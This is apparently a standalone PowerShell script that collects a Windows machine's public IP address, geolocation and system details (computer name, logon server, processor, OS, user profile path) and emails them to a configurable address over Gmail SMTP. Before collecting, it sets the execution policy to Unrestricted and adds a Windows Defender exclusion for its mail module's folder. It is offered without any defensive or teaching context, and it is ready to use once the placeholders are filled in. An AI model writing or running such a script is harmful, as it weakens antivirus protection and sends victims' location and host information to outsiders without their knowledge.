Set-ExecutionPolicy -Scope CurrentUser Unrestricted -Force
   

Install-Module -Name Send-MailKitMessage -Force
Import-module Send-MailKitMessage 
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Documents\WindowsPowershell\Modules\Send-MailKitMessage" 

# Get the real location using an IP geolocation service
$ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"

  
    $recipient = "Recipient Email Address here Exam: Hajus11@somthing.com"
    $sende = "Sender Email Address Here Exam: Mustafa@gmail.com"
    $usr = "Actual email address  that you want to use to send the email report Exam: Mustafa@gmail.com"
    $passwd = "Here actual  password that you want to use to send the email report"
    
    $securePasswd = ConvertTo-SecureString $passwd -AsPlainText -Force
    $credentials = New-Object System.Management.Automation.PSCredential($usr, $securePasswd)
    
$subject = "Information Report"

$body = @"

$realLocation  "Real Location: $ipInfo.loc"

$ipAddress  "IP Address: $ipInfo.ip"

$deviceName  "COMPUTERNAME: $env:COMPUTERNAME"
$Logonsrv  "LOGONSERVER: $env:LOGONSERVER"
$ProcessId  "PROCESSOR_IDENTIFIER: $env:PROCESSOR_IDENTIFIER"
$ProcessLev  "PROCESSOR_LEVEL: $env:PROCESSOR_LEVEL"
$OS  "OS: $env:OS"
$UsrProfile  "USERPROFILE: $env:USERPROFILE"

"@

$smtpServer = "smtp.gmail.com"
$smtpPort = 587


 Send-MailKitMessage -From $sende -Recipient $recipient -Subject $subject -TextBody $body  -SmtpServer $smtpServer -Port $smtpPort -Credential $credentials
